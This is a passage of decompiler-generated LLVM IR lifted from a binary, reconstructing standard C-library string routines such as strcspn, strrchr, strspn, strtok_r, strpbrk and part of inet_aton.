  %v3_1d890 = zext i8 %v2_1d890 to i32
  %v9_1d894 = icmp eq i32 %v3_1d890, %v1_1d888
  br i1 %v9_1d894, label %dec_label_pc_1d960, label %dec_label_pc_1d89c

dec_label_pc_1d89c:                               ; preds = %dec_label_pc_1d890
  %v2_1d89c = icmp eq i8 %v2_1d890, 0
  br i1 %v2_1d89c, label %dec_label_pc_1d960, label %dec_label_pc_1d8a4

dec_label_pc_1d8a4:                               ; preds = %dec_label_pc_1d89c
  %v1_1d8a4 = add i32 %v0_1d8a4, 1
  %v1_1d8a8 = urem i32 %v1_1d8a4, 4
  %v2_1d8a8 = icmp eq i32 %v1_1d8a8, 0
  br i1 %v2_1d8a8, label %dec_label_pc_1d8b0, label %dec_label_pc_1d890

dec_label_pc_1d8b0:                               ; preds = %dec_label_pc_1d8a4, %entry
  %v0_1d8b4 = phi i32 [ %v0_1d8a82, %entry ], [ %v1_1d8a4, %dec_label_pc_1d8a4 ]
  %v4_1d8b0 = mul nuw nsw i32 %v1_1d888, 256
  %v5_1d8b0 = or i32 %v4_1d8b0, %v1_1d888
  %v4_1d8b8 = mul i32 %v5_1d8b0, 65536
  %v5_1d8b8 = or i32 %v4_1d8b8, %v5_1d8b0
  br label %dec_label_pc_1d8bc

dec_label_pc_1d8bc:                               ; preds = %dec_label_pc_1d958, %dec_label_pc_1d8f8, %dec_label_pc_1d8b0
  %v0_1d920 = phi i32 [ %v0_1d8b4, %dec_label_pc_1d8b0 ], [ %v4_1d8bc, %dec_label_pc_1d8f8 ], [ %v4_1d8bc, %dec_label_pc_1d958 ]
  %v1_1d8bc = inttoptr i32 %v0_1d920 to i32*
  %v2_1d8bc = load i32, i32* %v1_1d8bc, align 4
  %v4_1d8bc = add i32 %v0_1d920, 4
  %v2_1d8c4 = xor i32 %v2_1d8bc, %v5_1d8b8
  %v2_1d8c8 = add i32 %v2_1d8c4, 2130640639
  store i32 %v2_1d8c8, i32* @ip, align 4
  %v2_1d8d0 = add i32 %v2_1d8bc, 2130640639
  %v1_1d8d4 = sub i32 -1, %v2_1d8bc
  %v2_1d8d8 = xor i32 %v2_1d8d0, %v1_1d8d4
  %v2_1d8e4 = and i32 %v2_1d8d8, -2130640640
  store i32 %v2_1d8e4, i32* @r1, align 4
  %v2_1d8ec = icmp eq i32 %v2_1d8e4, 0
  br i1 %v2_1d8ec, label %dec_label_pc_1d8f8, label %dec_label_pc_1d900

dec_label_pc_1d8f8:                               ; preds = %dec_label_pc_1d8bc
  %v1_1d8e0 = sub i32 -1, %v2_1d8c4
  %v2_1d8e8 = xor i32 %v2_1d8c8, %v1_1d8e0
  %v2_1d8f0 = and i32 %v2_1d8e8, -2130640640
  %v2_1d8f8 = icmp eq i32 %v2_1d8f0, 0
  br i1 %v2_1d8f8, label %dec_label_pc_1d8bc, label %dec_label_pc_1d900

dec_label_pc_1d900:                               ; preds = %dec_label_pc_1d8bc, %dec_label_pc_1d8f8
  %v2_1d900 = inttoptr i32 %v0_1d920 to i8*
  %v3_1d900 = load i8, i8* %v2_1d900, align 1
  %v4_1d900 = zext i8 %v3_1d900 to i32
  %v9_1d904 = icmp eq i32 %v4_1d900, %v1_1d888
  br i1 %v9_1d904, label %dec_label_pc_1d960, label %dec_label_pc_1d910

dec_label_pc_1d910:                               ; preds = %dec_label_pc_1d900
  %v2_1d910 = icmp eq i8 %v3_1d900, 0
  br i1 %v2_1d910, label %dec_label_pc_1d960, label %dec_label_pc_1d918

dec_label_pc_1d918:                               ; preds = %dec_label_pc_1d910
  %v1_1d918 = add i32 %v0_1d920, 1
  %v2_1d918 = inttoptr i32 %v1_1d918 to i8*
  %v3_1d918 = load i8, i8* %v2_1d918, align 1
  %v4_1d918 = zext i8 %v3_1d918 to i32
  %v9_1d91c = icmp eq i32 %v4_1d918, %v1_1d888
  br i1 %v9_1d91c, label %dec_label_pc_1d960, label %dec_label_pc_1d928

dec_label_pc_1d928:                               ; preds = %dec_label_pc_1d918
  %v2_1d928 = icmp eq i8 %v3_1d918, 0
  br i1 %v2_1d928, label %dec_label_pc_1d960, label %dec_label_pc_1d930

dec_label_pc_1d930:                               ; preds = %dec_label_pc_1d928
  %v1_1d930 = add i32 %v0_1d920, 2
  %v2_1d930 = inttoptr i32 %v1_1d930 to i8*
  %v3_1d930 = load i8, i8* %v2_1d930, align 1
  %v4_1d930 = zext i8 %v3_1d930 to i32
  %v9_1d934 = icmp eq i32 %v4_1d930, %v1_1d888
  br i1 %v9_1d934, label %dec_label_pc_1d960, label %dec_label_pc_1d940

dec_label_pc_1d940:                               ; preds = %dec_label_pc_1d930
  %v2_1d940 = icmp eq i8 %v3_1d930, 0
  br i1 %v2_1d940, label %dec_label_pc_1d960, label %dec_label_pc_1d948

dec_label_pc_1d948:                               ; preds = %dec_label_pc_1d940
  %v1_1d948 = add i32 %v0_1d920, 3
  %v2_1d948 = inttoptr i32 %v1_1d948 to i8*
  %v3_1d948 = load i8, i8* %v2_1d948, align 1
  %v4_1d948 = zext i8 %v3_1d948 to i32
  %v9_1d94c = icmp eq i32 %v4_1d948, %v1_1d888
  br i1 %v9_1d94c, label %dec_label_pc_1d960, label %dec_label_pc_1d958

dec_label_pc_1d958:                               ; preds = %dec_label_pc_1d948
  %v2_1d958 = icmp eq i8 %v3_1d948, 0
  br i1 %v2_1d958, label %dec_label_pc_1d960, label %dec_label_pc_1d8bc

dec_label_pc_1d960:                               ; preds = %dec_label_pc_1d89c, %dec_label_pc_1d890, %dec_label_pc_1d958, %dec_label_pc_1d948, %dec_label_pc_1d940, %dec_label_pc_1d930, %dec_label_pc_1d928, %dec_label_pc_1d918, %dec_label_pc_1d910, %dec_label_pc_1d900
  %v1_1d964 = phi i32 [ %v1_1d948, %dec_label_pc_1d958 ], [ %v1_1d948, %dec_label_pc_1d948 ], [ %v1_1d930, %dec_label_pc_1d940 ], [ %v1_1d930, %dec_label_pc_1d930 ], [ %v1_1d918, %dec_label_pc_1d928 ], [ %v1_1d918, %dec_label_pc_1d918 ], [ %v0_1d920, %dec_label_pc_1d910 ], [ %v0_1d920, %dec_label_pc_1d900 ], [ %v0_1d8a4, %dec_label_pc_1d890 ], [ %v0_1d8a4, %dec_label_pc_1d89c ]
  ret i32 %v1_1d964

; uselistorder directives
  uselistorder i32 %v4_1d8bc, { 1, 0 }
  uselistorder i32 %v2_1d8bc, { 0, 2, 1 }
  uselistorder i32 %v0_1d920, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1d8b0, { 1, 0 }
  uselistorder i32 %v1_1d8a4, { 1, 0, 2 }
  uselistorder i32 %v0_1d8a82, { 2, 1, 0 }
  uselistorder i32 %v1_1d888, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1d960, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1d900, { 1, 0 }
  uselistorder label %dec_label_pc_1d890, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1d970 = load i32, i32* @r4, align 4
  store i32 %v3_1d970, i32* %stack_var_-16, align 4
  %v6_1d970 = load i32, i32* @r5, align 4
  %v9_1d970 = load i32, i32* @r6, align 4
  %v0_1d974 = load i32, i32* @r0, align 4
  %v0_1d978 = load i32, i32* @r1, align 4
  store i32 %v0_1d978, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_1d9948 = inttoptr i32 %v0_1d974 to i8*
  %v2_1d9949 = load i8, i8* %v1_1d9948, align 1
  %v3_1d99410 = zext i8 %v2_1d9949 to i32
  store i32 %v3_1d99410, i32* @r1, align 4
  %v2_1d99811 = icmp eq i8 %v2_1d9949, 0
  store i32 %v0_1d978, i32* @r0, align 4
  %v1_1d9a012 = add i32 %v0_1d974, 1
  store i32 %v1_1d9a012, i32* @r4, align 4
  br i1 %v2_1d99811, label %dec_label_pc_1d9a8, label %dec_label_pc_1d984

dec_label_pc_1d984:                               ; preds = %entry, %dec_label_pc_1d990
  %v3_1d99414 = phi i32 [ %v3_1d994, %dec_label_pc_1d990 ], [ %v3_1d99410, %entry ]
  %v0_1d99c13 = phi i32 [ %v0_1d99c.pre, %dec_label_pc_1d990 ], [ %v0_1d978, %entry ]
  %v2_1d984 = call i32 @__GI_strchr(i32 %v0_1d99c13, i32 %v3_1d99414)
  %v2_1d988 = icmp eq i32 %v2_1d984, 0
  %v0_1d990 = load i32, i32* @r5, align 4
  br i1 %v2_1d988, label %dec_label_pc_1d990, label %dec_label_pc_1d9a8

dec_label_pc_1d990:                               ; preds = %dec_label_pc_1d984
  %v1_1d990 = add i32 %v0_1d990, 1
  %v0_1d994.pre = load i32, i32* @r4, align 4
  %v0_1d99c.pre = load i32, i32* @r6, align 4
  store i32 %v1_1d990, i32* @r5, align 4
  %v1_1d994 = inttoptr i32 %v0_1d994.pre to i8*
  %v2_1d994 = load i8, i8* %v1_1d994, align 1
  %v3_1d994 = zext i8 %v2_1d994 to i32
  store i32 %v3_1d994, i32* @r1, align 4
  %v2_1d998 = icmp eq i8 %v2_1d994, 0
  store i32 %v0_1d99c.pre, i32* @r0, align 4
  %v1_1d9a0 = add i32 %v0_1d994.pre, 1
  store i32 %v1_1d9a0, i32* @r4, align 4
  br i1 %v2_1d998, label %dec_label_pc_1d9a8, label %dec_label_pc_1d984

dec_label_pc_1d9a8:                               ; preds = %dec_label_pc_1d990, %dec_label_pc_1d984, %entry
  %v0_1d9a8 = phi i32 [ 0, %entry ], [ %v0_1d990, %dec_label_pc_1d984 ], [ %v1_1d990, %dec_label_pc_1d990 ]
  %v2_1d9ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d9ac, i32* @r4, align 4
  store i32 %v6_1d970, i32* @r5, align 4
  store i32 %v9_1d970, i32* @r6, align 4
  ret i32 %v0_1d9a8

; uselistorder directives
  uselistorder i32 %v3_1d994, { 1, 0 }
  uselistorder i32 %v0_1d99c.pre, { 1, 0 }
  uselistorder i32 %v0_1d994.pre, { 1, 0 }
  uselistorder label %dec_label_pc_1d984, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1d9b8 = urem i32 %arg2, 256
  store i32 %v1_1d9b8, i32* @r4, align 4
  %v2_1d9b8 = icmp eq i32 %v1_1d9b8, 0
  br i1 %v2_1d9b8, label %dec_label_pc_1d9cc, label %dec_label_pc_1d9e0.preheader

dec_label_pc_1d9e0.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1d9e83 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_1d9b8)
  %v2_1d9ec5 = icmp eq i32 %v2_1d9e83, 0
  br i1 %v2_1d9ec5, label %dec_label_pc_1d9f4, label %dec_label_pc_1d9d8

dec_label_pc_1d9cc:                               ; preds = %entry
  %v2_1d9d0 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_1d9f8

dec_label_pc_1d9d8:                               ; preds = %dec_label_pc_1d9e0.preheader, %dec_label_pc_1d9d8
  %v2_1d9e86 = phi i32 [ %v2_1d9e8, %dec_label_pc_1d9d8 ], [ %v2_1d9e83, %dec_label_pc_1d9e0.preheader ]
  store i32 %v2_1d9e86, i32* @r5, align 4
  %v1_1d9dc = add i32 %v2_1d9e86, 1
  store i32 %v1_1d9dc, i32* @r0, align 4
  %v0_1d9e4 = load i32, i32* @r4, align 4
  %v2_1d9e8 = call i32 @__GI_strchr(i32 %v1_1d9dc, i32 %v0_1d9e4)
  %v2_1d9ec = icmp eq i32 %v2_1d9e8, 0
  br i1 %v2_1d9ec, label %dec_label_pc_1d9f4, label %dec_label_pc_1d9d8

dec_label_pc_1d9f4:                               ; preds = %dec_label_pc_1d9d8, %dec_label_pc_1d9e0.preheader
  %v0_1d9f4 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1d9f8

dec_label_pc_1d9f8:                               ; preds = %dec_label_pc_1d9cc, %dec_label_pc_1d9f4
  %storemerge = phi i32 [ %v2_1d9d0, %dec_label_pc_1d9cc ], [ %v0_1d9f4, %dec_label_pc_1d9f4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_1d9e8, { 1, 0 }
  uselistorder i32 %v1_1d9dc, { 1, 0 }
  uselistorder i32 %v1_1d9b8, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1d9f8, { 1, 0 }
  uselistorder label %dec_label_pc_1d9d8, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_1da342 = load i32, i32* @r0, align 4
  %v1_1da343 = inttoptr i32 %v0_1da342 to i8*
  %v2_1da344 = load i8, i8* %v1_1da343, align 1
  %v3_1da345 = zext i8 %v2_1da344 to i32
  store i32 %v3_1da345, i32* @ip, align 4
  %v2_1da386 = icmp eq i8 %v2_1da344, 0
  br i1 %v2_1da386, label %dec_label_pc_1da44, label %dec_label_pc_1da18.preheader

dec_label_pc_1da10:                               ; preds = %dec_label_pc_1da18
  %v3_1da18 = zext i8 %v2_1da18 to i32
  %v1_1da20 = add i32 %v0_1da20, 1
  %v9_1da10 = icmp eq i32 %v0_1da1010, %v3_1da18
  br i1 %v9_1da10, label %dec_label_pc_1da2c, label %dec_label_pc_1da18

dec_label_pc_1da18:                               ; preds = %dec_label_pc_1da18.preheader, %dec_label_pc_1da10
  %v0_1da20 = phi i32 [ %tmp, %dec_label_pc_1da18.preheader ], [ %v1_1da20, %dec_label_pc_1da10 ]
  %v1_1da18 = inttoptr i32 %v0_1da20 to i8*
  %v2_1da18 = load i8, i8* %v1_1da18, align 1
  %v2_1da1c = icmp eq i8 %v2_1da18, 0
  br i1 %v2_1da1c, label %dec_label_pc_1da44, label %dec_label_pc_1da10

dec_label_pc_1da2c:                               ; preds = %dec_label_pc_1da10
  %v1_1da2c = add i32 %v0_1da2c, 1
  %v1_1da30 = add i32 %v0_1da30, 1
  %v1_1da34 = inttoptr i32 %v1_1da30 to i8*
  %v2_1da34 = load i8, i8* %v1_1da34, align 1
  %v3_1da34 = zext i8 %v2_1da34 to i32
  store i32 %v3_1da34, i32* @ip, align 4
  %v2_1da38 = icmp eq i8 %v2_1da34, 0
  br i1 %v2_1da38, label %dec_label_pc_1da44, label %dec_label_pc_1da18.preheader

dec_label_pc_1da18.preheader:                     ; preds = %entry, %dec_label_pc_1da2c
  %v0_1da30 = phi i32 [ %v1_1da30, %dec_label_pc_1da2c ], [ %v0_1da342, %entry ]
  %v0_1da2c = phi i32 [ %v1_1da2c, %dec_label_pc_1da2c ], [ 0, %entry ]
  %v0_1da1010 = phi i32 [ %v3_1da34, %dec_label_pc_1da2c ], [ %v3_1da345, %entry ]
  br label %dec_label_pc_1da18

dec_label_pc_1da44:                               ; preds = %dec_label_pc_1da2c, %dec_label_pc_1da18, %entry
  %v0_1da44 = phi i32 [ 0, %entry ], [ %v0_1da2c, %dec_label_pc_1da18 ], [ %v1_1da2c, %dec_label_pc_1da2c ]
  ret i32 %v0_1da44

; uselistorder directives
  uselistorder i32 %v0_1da20, { 1, 0 }
  uselistorder label %dec_label_pc_1da18.preheader, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1da50 = load i32, i32* @r4, align 4
  store i32 %v3_1da50, i32* %stack_var_-16, align 4
  %v0_1da54 = load i32, i32* @r0, align 4
  store i32 %v0_1da54, i32* %r4.global-to-local, align 4
  %v2_1da54 = icmp eq i32 %v0_1da54, 0
  %v1_1da58 = load i32, i32* @r2, align 4
  br i1 %v2_1da54, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_1da58 = inttoptr i32 %v1_1da58 to i32*
  %v3_1da58 = load i32, i32* %v2_1da58, align 4
  store i32 %v3_1da58, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1da5c = phi i32 [ %v3_1da58, %bb ], [ %v0_1da54, %entry ]
  store i32 %v0_1da5c, i32* @r0, align 4
  store i32 %v1_1da58, i32* %r5.global-to-local, align 4
  %v0_1da64 = load i32, i32* @r1, align 4
  store i32 %v0_1da64, i32* %r6.global-to-local, align 4
  %v1_1da68 = inttoptr i32 %v0_1da5c to i8*
  %v2_1da68 = call i32 @__GI_strspn(i8* %v1_1da68)
  %v0_1da6c = load i32, i32* %r4.global-to-local, align 4
  %v2_1da6c = add i32 %v0_1da6c, %v2_1da68
  %v3_1da6c = inttoptr i32 %v2_1da6c to i8*
  %v4_1da6c = load i8, i8* %v3_1da6c, align 1
  %v6_1da6c = zext i8 %v4_1da6c to i32
  store i32 %v6_1da6c, i32* %r3.global-to-local, align 4
  store i32 %v2_1da6c, i32* @r4, align 4
  %v2_1da74 = icmp eq i8 %v4_1da6c, 0
  br i1 %v2_1da74, label %bb8, label %dec_label_pc_1da80

bb8:                                              ; preds = %entry._crit_edge
  %v2_1da78 = load i32, i32* %r5.global-to-local, align 4
  %v3_1da78 = inttoptr i32 %v2_1da78 to i32*
  store i32 %v2_1da6c, i32* %v3_1da78, align 4
  br label %dec_label_pc_1dabc

dec_label_pc_1da80:                               ; preds = %entry._crit_edge
  %v0_1da80 = load i32, i32* %r6.global-to-local, align 4
  %v3_1da88 = call i32 @__GI_strpbrk(i8* %v3_1da6c, i32 %v0_1da80)
  %v3_1da8c = icmp eq i32 %v3_1da88, 0
  br i1 %v3_1da8c, label %dec_label_pc_1da94, label %dec_label_pc_1daac

dec_label_pc_1da94:                               ; preds = %dec_label_pc_1da80
  %v0_1da98 = load i32, i32* @r4, align 4
  store i32 %v0_1da98, i32* @r0, align 4
  %v2_1da9c = call i32 @rawmemchr(i32 %v0_1da98, i32 0)
  %v0_1daa0 = load i32, i32* @r4, align 4
  store i32 %v0_1daa0, i32* %r3.global-to-local, align 4
  %v1_1daa4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1daa4 = inttoptr i32 %v1_1daa4 to i32*
  store i32 %v2_1da9c, i32* %v2_1daa4, align 4
  br label %dec_label_pc_1dabc

dec_label_pc_1daac:                               ; preds = %dec_label_pc_1da80
  %v4_1da88 = inttoptr i32 %v3_1da88 to i8*
  store i8 0, i8* %v4_1da88, align 1
  %v7_1dab0 = add i32 %v3_1da88, 1
  %v1_1dab4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1dab4 = inttoptr i32 %v1_1dab4 to i32*
  store i32 %v7_1dab0, i32* %v2_1dab4, align 4
  %v0_1dab8 = load i32, i32* @r4, align 4
  store i32 %v0_1dab8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1dabc

dec_label_pc_1dabc:                               ; preds = %bb8, %dec_label_pc_1da94, %dec_label_pc_1daac
  %v0_1dabc = load i32, i32* %r3.global-to-local, align 4
  %v2_1dac0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1dac0, i32* @r4, align 4
  ret i32 %v0_1dabc

; uselistorder directives
  uselistorder i32 %v3_1da88, { 0, 2, 1 }
  uselistorder i32 %v0_1da5c, { 1, 0 }
  uselistorder i32 %v0_1da54, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1dabc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1daf4

dec_label_pc_1dad0:                               ; preds = %dec_label_pc_1dae0
  %v3_1dae0 = zext i8 %v2_1dae0 to i32
  %v1_1dae8 = add i32 %v0_1dae8, 1
  %v1_1dad0 = load i32, i32* %r0.global-to-local, align 4
  %v9_1dad0 = icmp eq i32 %v3_1dae0, %v1_1dad0
  br i1 %v9_1dad0, label %dec_label_pc_1dad8, label %dec_label_pc_1dae0

dec_label_pc_1dad8:                               ; preds = %dec_label_pc_1dad0
  %v0_1dad8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1dad8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1dad8

dec_label_pc_1dae0:                               ; preds = %dec_label_pc_1dad0, %dec_label_pc_1daf4
  %v0_1dae8 = phi i32 [ %v1_1dae8, %dec_label_pc_1dad0 ], [ %arg2, %dec_label_pc_1daf4 ]
  %v1_1dae0 = inttoptr i32 %v0_1dae8 to i8*
  %v2_1dae0 = load i8, i8* %v1_1dae0, align 1
  %v2_1dae4 = icmp eq i8 %v2_1dae0, 0
  br i1 %v2_1dae4, label %dec_label_pc_1daf0, label %dec_label_pc_1dad0

dec_label_pc_1daf0:                               ; preds = %dec_label_pc_1dae0
  %v0_1daf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1daf0 = add i32 %v0_1daf0, 1
  br label %dec_label_pc_1daf4

dec_label_pc_1daf4:                               ; preds = %entry, %dec_label_pc_1daf0
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_1daf0, %dec_label_pc_1daf0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1daf4 = inttoptr i32 %storemerge to i8*
  %v2_1daf4 = load i8, i8* %v1_1daf4, align 1
  %v3_1daf4 = zext i8 %v2_1daf4 to i32
  store i32 %v3_1daf4, i32* %r0.global-to-local, align 4
  %v2_1daf8 = icmp eq i8 %v2_1daf4, 0
  %v0_1dafc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1daf8, i32 %v0_1dafc)
  br label %dec_label_pc_1dae0

; uselistorder directives
  uselistorder i32 %v0_1dae8, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1daf4, { 1, 0 }
  uselistorder label %dec_label_pc_1dae0, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1db08 = load i32, i32* @r4, align 4
  store i32 %v3_1db08, i32* %stack_var_-28, align 4
  %v0_1db10 = load i32, i32* %r0.global-to-local, align 4
  %v2_1db10 = icmp eq i32 %v0_1db10, 0
  br i1 %v2_1db10, label %dec_label_pc_1dbec, label %dec_label_pc_1db20

dec_label_pc_1db20:                               ; preds = %entry
  br label %dec_label_pc_1db38

dec_label_pc_1db38:                               ; preds = %dec_label_pc_1db20, %dec_label_pc_1dbb0
  %v1_1dbb0 = phi i32 [ 0, %dec_label_pc_1db20 ], [ %v5_1dbb0, %dec_label_pc_1dbb0 ]
  %v0_1dbb4 = phi i32 [ 1, %dec_label_pc_1db20 ], [ %v1_1dbb4, %dec_label_pc_1dbb0 ]
  %v0_1db38 = phi i32 [ %v0_1db10, %dec_label_pc_1db20 ], [ %v0_1db3812, %dec_label_pc_1dbb0 ]
  %v1_1db38 = inttoptr i32 %v0_1db38 to i8*
  %v2_1db38 = load i8, i8* %v1_1db38, align 1
  %v3_1db38 = zext i8 %v2_1db38 to i32
  %v4_1db3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 636) to i32*), align 4
  store i32 %v4_1db3c, i32* @r1, align 4
  %v2_1db40 = mul nuw nsw i32 %v3_1db38, 2
  %v2_1db44 = add i32 %v2_1db40, %v4_1db3c
  %v3_1db44 = inttoptr i32 %v2_1db44 to i16*
  %v4_1db44 = load i16, i16* %v3_1db44, align 2
  %v1_1db48 = and i16 %v4_1db44, 8
  %v2_1db48 = icmp eq i16 %v1_1db48, 0
  br i1 %v2_1db48, label %dec_label_pc_1dbec, label %dec_label_pc_1db50

dec_label_pc_1db50:                               ; preds = %dec_label_pc_1db38
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1db70

dec_label_pc_1db58:                               ; preds = %dec_label_pc_1db70
  %v2_1db58 = mul i32 %v0_1dbb0, 10
  %v1_1db5c = add i32 %v2_1db58, -48
  %v2_1db60 = add i32 %v3_1db70, %v1_1db5c
  store i32 %v2_1db60, i32* @ip, align 4
  %v8_1db68 = icmp sgt i32 %v2_1db60, 255
  br i1 %v8_1db68, label %dec_label_pc_1dbec, label %dec_label_pc_1db6c

dec_label_pc_1db6c:                               ; preds = %dec_label_pc_1db58
  %v1_1db6c = add i32 %v0_1dba0, 1
  store i32 %v1_1db6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1db70

dec_label_pc_1db70:                               ; preds = %dec_label_pc_1db50, %dec_label_pc_1db6c
  %v0_1dbb0 = phi i32 [ 0, %dec_label_pc_1db50 ], [ %v2_1db60, %dec_label_pc_1db6c ]
  %v0_1dba0 = phi i32 [ %v0_1db38, %dec_label_pc_1db50 ], [ %v1_1db6c, %dec_label_pc_1db6c ]
  %v1_1db70 = inttoptr i32 %v0_1dba0 to i8*
  %v2_1db70 = load i8, i8* %v1_1db70, align 1
  %v3_1db70 = zext i8 %v2_1db70 to i32
  %v2_1db74 = mul nuw nsw i32 %v3_1db70, 2
  %v2_1db78 = add i32 %v2_1db74, %v4_1db3c
  %v3_1db78 = inttoptr i32 %v2_1db78 to i16*
  %v4_1db78 = load i16, i16* %v3_1db78, align 2
  %v6_1db78 = zext i16 %v4_1db78 to i32
  %v1_1db7c = and i32 %v6_1db78, 8
  %v2_1db7c = icmp eq i32 %v1_1db7c, 0
  br i1 %v2_1db7c, label %dec_label_pc_1db84, label %dec_label_pc_1db58

dec_label_pc_1db84:                               ; preds = %dec_label_pc_1db70
  %v7_1db84 = icmp eq i32 %v0_1dbb4, 4
  br i1 %v7_1db84, label %dec_label_pc_1db9c, label %dec_label_pc_1db8c

dec_label_pc_1db8c:                               ; preds = %dec_label_pc_1db84
  %v7_1db8c = icmp eq i8 %v2_1db70, 46
  br i1 %v7_1db8c, label %dec_label_pc_1db94, label %dec_label_pc_1dbec

dec_label_pc_1db94:                               ; preds = %dec_label_pc_1db8c
  %v1_1db94 = add i32 %v0_1dba0, 1
  store i32 %v1_1db94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1dbb0

dec_label_pc_1db9c:                               ; preds = %dec_label_pc_1db84
  %v2_1db9c = icmp eq i8 %v2_1db70, 0
  %v1_1dba0 = add i32 %v0_1dba0, 1
  store i32 %v1_1dba0, i32* %r0.global-to-local, align 4
  br i1 %v2_1db9c, label %dec_label_pc_1dbb0, label %dec_label_pc_1dba8

dec_label_pc_1dba8:                               ; preds = %dec_label_pc_1db9c
  %v1_1dba8 = and i32 %v6_1db78, 32
  %v2_1dba8 = icmp eq i32 %v1_1dba8, 0
  br i1 %v2_1dba8, label %dec_label_pc_1dbec, label %dec_label_pc_1dbb0

dec_label_pc_1dbb0:                               ; preds = %dec_label_pc_1dba8, %dec_label_pc_1db9c, %dec_label_pc_1db94
  %v0_1db3812 = phi i32 [ %v1_1dba0, %dec_label_pc_1dba8 ], [ %v1_1dba0, %dec_label_pc_1db9c ], [ %v1_1db94, %dec_label_pc_1db94 ]
  %v4_1dbb0 = mul i32 %v1_1dbb0, 256
  %v5_1dbb0 = or i32 %v0_1dbb0, %v4_1dbb0
  %v1_1dbb4 = add nuw nsw i32 %v0_1dbb4, 1
  %v7_1dbbc = icmp slt i32 %v1_1dbb4, 5
  br i1 %v7_1dbbc, label %dec_label_pc_1db38, label %dec_label_pc_1dbc0

dec_label_pc_1dbc0:                               ; preds = %dec_label_pc_1dbb0
  %v2_1dbc0 = icmp eq i32 %arg2, 0
  br i1 %v2_1dbc0, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_1dbc0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1dbf0

bb:                                               ; preds = %dec_label_pc_1dbc0
  %v4_1dbc4 = udiv i32 %v5_1dbb0, 16777216
  %v2_1dbc8 = udiv i32 %v5_1dbb0, 256
  %v5_1dbcc = and i32 %v2_1dbc8, 65280
  %v2_1dbd0 = and i32 %v5_1dbb0, 65280
  %v5_1dbd4 = mul nuw nsw i32 %v2_1dbd0, 256
  %v5_1dbd8 = mul i32 %v0_1dbb0, 16777216
  %v6_1dbcc = or i32 %v4_1dbc4, %v5_1dbd8
  %v6_1dbd4 = or i32 %v6_1dbcc, %v5_1dbcc
  %v6_1dbd8 = or i32 %v6_1dbd4, %v5_1dbd4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1dbe4 = inttoptr i32 %arg2 to i32*
  store i32 %v6_1dbd8, i32* %v3_1dbe4, align 4
  %v2_1dbf0.pre = load i32, i32* %stack_var_-28, align 4
  %v1_1dbf4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1dbf0

dec_label_pc_1dbec:                               ; preds = %dec_label_pc_1db8c, %dec_label_pc_1dba8, %dec_label_pc_1db38, %dec_label_pc_1db58, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1dbf0

